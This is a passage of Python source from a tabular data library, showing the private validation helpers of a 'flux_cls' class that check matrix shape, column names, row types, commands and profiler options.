            m = list(m)
        elif isinstance(m, array):
            m = list(m)
        elif isinstance(m, ItemsView):
            m = list(transpose(m, astype=list))
        elif isinstance(m, dict):
            m = list(transpose(m.items(), astype=list))

        if not is_subscriptable(m):
            # raise IndexError('matrix must be subscriptable')
            raise IndexError('matrix must have at least one iterable dimension (ie, a list)')

        ''' @types '''
        row_first: Union[flux_row_cls, namedtuple, dict, object]
        row:       Union[flux_row_cls, namedtuple, dict, object]

        row_first = m[0]

        # list of flux_row_cls objects
        if isinstance(row_first, flux_row_cls):
            if row_first.is_header_row():
                m = [[*row.values] for row in m]
            else:
                m = [[*row_first.header_names()]] + \
                    [[*row.values] for row in m]

        # list of dictionaries
        elif isinstance(row_first, dict):
            m = [[*row_first.keys()]] + \
                [[*row.values()] for row in m]

        # list of namedtuples
        elif hasattr(row_first, '_fields'):
            m = [[*row_first._fields]] + \
                [[*row] for row in m]

        # list of objects
        elif hasattr(row_first, '__dict__'):
            m = [[*row_first.__dict__.keys()]] + \
                [[*row.__dict__.values()] for row in m]

        # list of objects (with __slots__ attributes)
        elif hasattr(row_first, '__slots__'):
            h = list(row_first.__slots__)
            m = [[*row_first.__slots__]] + \
                [[*[row.__getattribute__(n) for n in h]] for row in m]

        else:
            if iteration_depth(m, first_element_only=True) < 2:
                raise IterationDepthError('matrix must have at least two iterable dimensions (ie, a list of lists)')

        return m

    @staticmethod
    def __validate_row_values_accessor(names, headers):
        # region {closure}
        def is_slice_all():
            return rva_indices.start in (None, 0) and \
                   rva_indices.stop  in (None, len(headers)) and \
                   rva_indices.step  in (None, 1)
        # endregion

        names = flux_cls.__validate_names_not_empty(names, depth_offset=-1)

        if callable(names):
            rva_name    = 'callable'
            rva_indices = names
        elif isinstance(names, slice):
            rva_indices = names

            if is_slice_all():
                rva_name = 'row_values_all'
            else:
                rva_name = 'row_values_slice'
        elif iteration_depth(names) == 0:
            rva_name    = 'row_value'
            rva_indices = flux_cls.__validate_names_as_indices(names, headers)[0]
        else:
            rva_name    = 'row_values'
            rva_indices = flux_cls.__validate_names_as_indices(names, headers)

            if are_indices_contiguous(rva_indices):
                rva_indices = slice(rva_indices[0], rva_indices[-1]+1)

                if is_slice_all():
                    rva_name = 'row_values_all'
                else:
                    rva_name = 'row_values_slice'

        return rva_name, rva_indices

    @staticmethod
    def __validate_mapped_rowtype(rowtype):
        valid_datatypes = ('flux_row_cls',
                           'namedrow',
                           'namedtuple',
                           'tuple',
                           'list',
                           'dict')

        if isinstance(rowtype, str):
            rowtype = rowtype.lower()
        else:
            rowtype = object_name(rowtype)

        if rowtype.endswith('s') and rowtype != 'flux_row_cls':
            rowtype = rowtype[:-1]

        if rowtype not in valid_datatypes:
            v = '\n\t'.join(valid_datatypes)
            s = ("invalid row datatype: '{}'\n"
                 "valid types are: ({})\n\n"
                 '\t(Make sure any arguments following variable position parameters are submitted by keyword)\n'
                 "\teg: \n"
                 "\t\tflux.sort('column_a', 'column_b', reverse=True)\n"
                 '\tand not: \n'
                 "\t\tflux.sort('column_a', 'column_b', True)"
                 .format(rowtype, v))

            raise TypeError(s)

        return rowtype

    @staticmethod
    def __validate_names_not_empty(names,
                                   headers=None,
                                   depth=None,
                                   depth_offset=None):

        names = flux_cls.__validate_standardize_names(names, headers, depth, depth_offset)
        if is_collection(names) and len(names) == 0:
            raise ColumnNameError('no column names submitted')

        return names

    @staticmethod
    def __validate_standardize_names(names,
                                     headers=None,
                                     depth=None,
                                     depth_offset=None):

        names = standardize_variable_arity_values(names,
                                                  depth=depth,
                                                  depth_offset=depth_offset)
        if isinstance(names, slice) and isinstance(headers, dict):
            names = list(headers.keys())[names]

        return names

    @staticmethod
    def __validate_name_datatypes(names, headers=None):
        valid_datatypes = (int, 
                           str, 
                           bytes)

        names   = flux_cls.__validate_standardize_names(names, headers, depth=1)
        invalid = [n for n in names if not isinstance(n, valid_datatypes)]

        if invalid:
            v = ', '.join(v.__name__ for v in valid_datatypes)
            s = ("invalid column datatype: '{}'\n"
                 "valid types are: ({})\n\n"
                 '\t(Make sure any arguments following variable position parameters are submitted by keyword)\n'
                 "\teg: \n"
                 "\t\tflux.sort('column_a', 'column_b', reverse=True)\n"
                 '\tand not: \n'
                 "\t\tflux.sort('column_a', 'column_b', True)"
                 .format(invalid, v))

            raise TypeError(s)

        return names

    @staticmethod
    def __validate_insertion_names(inserted, headers):
        if isinstance(inserted, dict):
            inserted = list(inserted.items())

        inserted = standardize_variable_arity_values(inserted, depth=2)

        for item in inserted:
            if iteration_depth(item) != 1 or len(item) != 2:
                raise IterationDepthError("inserted values must be ({location}, {name}) tuples "
                                          "\n\teg: (2, 'new_col') "
                                          "\n\teg: [('col_a', 'new_col_a'), ('col_b', 'new_col_b')]")

        indices, names = list(zip(*inserted))

        flux_cls.__validate_name_datatypes(names)
        flux_cls.__validate_no_duplicate_names(names)
        flux_cls.__validate_no_names_intersect_with_headers(names, headers)
        flux_cls.__validate_all_names_intersect_with_headers(indices, headers)

        return inserted

    @staticmethod
    def __validate_no_duplicate_names(names):
        names = flux_cls.__validate_standardize_names(names, depth=1)

        duplicates = [n for n, count in Counter(names).items() if count > 1]
        if duplicates:
            raise ColumnNameError('duplicate column name detected: \n{}'.format(duplicates))

        return names

    @staticmethod
    def __validate_no_names_intersect_with_headers(names, headers):
        names = flux_cls.__validate_standardize_names(names, headers, depth=1)

        conflicting = headers.keys() & set(names)
        if conflicting:
            raise ColumnNameError('column names already exist: \n{}'.format(conflicting))

        return names

    @staticmethod
    def __validate_all_names_intersect_with_headers(names, headers):
        names = flux_cls.__validate_standardize_names(names, headers, depth=1)

        h_names = [*[ i for i in range(len(headers))],
                   *[-i for i in range(len(headers) + 1)]]
        h_names = headers.keys() | set(h_names)

        invalid = set(names) - h_names
        if invalid:
            s = '\n\t'.join((repr(n)[1:-1].replace(',', ':')
                                          .replace("'", '')
                                          .replace('"', '')) for n in headers.items())
            s = ("'{}' column name does not exist, available columns: "
                 "\n\t{}".format(invalid, s))

            raise ColumnNameError(s)

        return names

    @staticmethod
    def __validate_names_as_indices(names, headers):
        names = flux_cls.__validate_name_datatypes(names)
        names = flux_cls.__validate_all_names_intersect_with_headers(names, headers)

        h_indices = list(headers.values())
        indices = [headers.get(n, n) for n in names]       # lookup strings
        indices = [h_indices[i] for i in indices]          # lookup negative integers

        return indices

    @staticmethod
    def __validate_renamed_or_inserted_column(name, headers):
        is_remapped_column = isinstance(name, dict)
        is_inserted_column = (isinstance(name, str)   and name.startswith('(')  and name.endswith(')') or
                              isinstance(name, bytes) and name.startswith(b'(') and name.endswith(b')')
                              and name not in headers)

        if is_remapped_column:
            name_old, name = list(name.items())[0]
            headers[name]  = headers[name_old]
        elif is_inserted_column:
            name = name[1:-1]
            if name in headers:
                raise ColumnNameError("column: '{}' already exists".format(name))

        elif name not in headers:
            raise ColumnNameError("column: '{name}' does not exist. "
                                  "\nTo ensure new columns are being created intentionally (not a new column "
                                  "because to a typo) inserted headers must be surrounded by parenthesis, eg: "
                                  "\n '({name})', not '{name}'".format(name=name))

        return name

    def __validate_command_methods(self, commands, command_namedtuple):
        parsed = []
        for command in commands:
            args   = []
            kwargs = {}

            if isinstance(command, (list, tuple)):
                attr = command[0]

                for arg in command[1:]:
                    if isinstance(arg, dict):
                        kwargs.update(arg)
                    elif isinstance(arg, (list, tuple)):
                        args.extend(arg)
                    else:
                        args.append(arg)
            else:
                attr = command

            if attr.startswith('__'):
                attr = '_{}{}'.format(self.__class__.__name__, attr)

            args   = tuple(args)
            method = getattr(self, attr)

            parsed.append(command_namedtuple(command, attr, method, args, kwargs))

        return parsed

    # noinspection PyUnresolvedReferences
    @staticmethod
    def __validate_profiler_function(which_profiler):
        if which_profiler in (None, False):
            return None

        formatter = '           {formatted_runtime}'
        # formatter = '           {formatted_elapsed}'

        if which_profiler is True:
            if line_profiler_installed:
                from line_profiler import LineProfiler
                return LineProfiler()
            else:
                return print_runtime(formatter=formatter)

        which_profiler = str(which_profiler).lower()

        if which_profiler in ('print_runtime', 'print-runtime', 'printruntime'):
            return print_runtime(formatter=formatter)

        if which_profiler in ('line_profiler', 'line-profiler', 'lineprofiler'):
            if line_profiler_installed is False:
                raise ImportError("'line_profiler' package not installed")

            from line_profiler import LineProfiler
            return LineProfiler()

        raise ValueError("invalid profiler: '{}', profiler should be in "
                         "\n(None, False, True, 'print_runtime', 'line_profiler')".format(profiler))

    def __validate_column_value_dimensions(self, names, values):
        # _values_ = values

        values = iterator_to_collection(values)
        nd     = iteration_depth(values, first_element_only=True)

        num_rows = len(self.matrix) - 1
        num_cols = len(names)

        if nd == 0:
            if num_cols == 1:
                values = [values for _ in range(num_rows)]
            else:
                values = [[values] * num_cols
                          for _ in range(num_rows)]

            v_num_cols = num_cols
        elif nd == 1:
            v_num_cols = 1
        else:
            v_num_cols = len(values[0])

        v_num_rows = len(values)

        mismatched_dimensions = (v_num_rows != num_rows) or \
                                (v_num_cols != num_cols and num_cols > 1)
        if mismatched_dimensions:
            raise IndexError('invalid dimensions for column values\n\t'
                             'expected: {:,} cols x {:,} rows\n\t'
                             'recieved: {:,} cols x {:,} rows'.format(num_cols, num_rows,
                                                                      v_num_cols, v_num_rows))

        return values

    def __validate_preview_matrix(self, preview_indices=None):
        """
        to help with debugging: meant to trigger a debugging feature in PyCharm.
        PyCharm will recognize the numpy array and enable the "...view as array"
        option in the debugger which displays values in a special window as a table
        """
        # region {closure functions}
        def format_row_index_label(i_1, i_2):

            matches_row_label = (i_1 == i_2)

            i_1 = format_integer(i_1)
            i_1 = '[{}]'.format(i_1)

            if matches_row_label:
                return i_1

            if isinstance(i_2, int):
                i_2 = format_integer(i_2)
                i_2 = surround_single_brackets(i_2)

            return '{} :: {}'.format(i_1, i_2)

        # endregion

        if preview_indices is None:
            pvi = self.preview_indices
        else:
            pvi = preview_indices

        rows_max = len(self.matrix) - 1

        if isinstance(pvi, slice):
            r_1, r_2, _ = pvi.indices(rows_max)
            indices     = list(range(r_1, r_2 + 1))
        elif isinstance(pvi, (list, tuple)):
            indices = [i for i in pvi
                         if i <= rows_max]
        else:
            raise TypeError('invalid type for preview_indices, must be (slice, list, tuple)')

        rows = [self.matrix[i] for i in indices]

        if rows:
            cols_max = max([len(row.values) for row in rows])
        else:
            cols_max = 0

        cols_max = max(cols_max, self.num_cols)

        h_v = [surround_double_brackets(n) for n in self.header_names()]
        h_j = ['🗲missing🗲'] * (cols_max - len(h_v))

        if (not h_v) and cols_max < 1:
            return [[]]

        m = [['{index :: label}', *h_v, *h_j]]

        for i, row in zip(indices, rows):
            r_f = format_row_index_label(i, row.row_label)
            r_v = row.values
            r_j = ['🗲missing🗲'] * (cols_max - len(r_v))

            m.append([r_f, *r_v, *r_j])

        return m
    # endregion
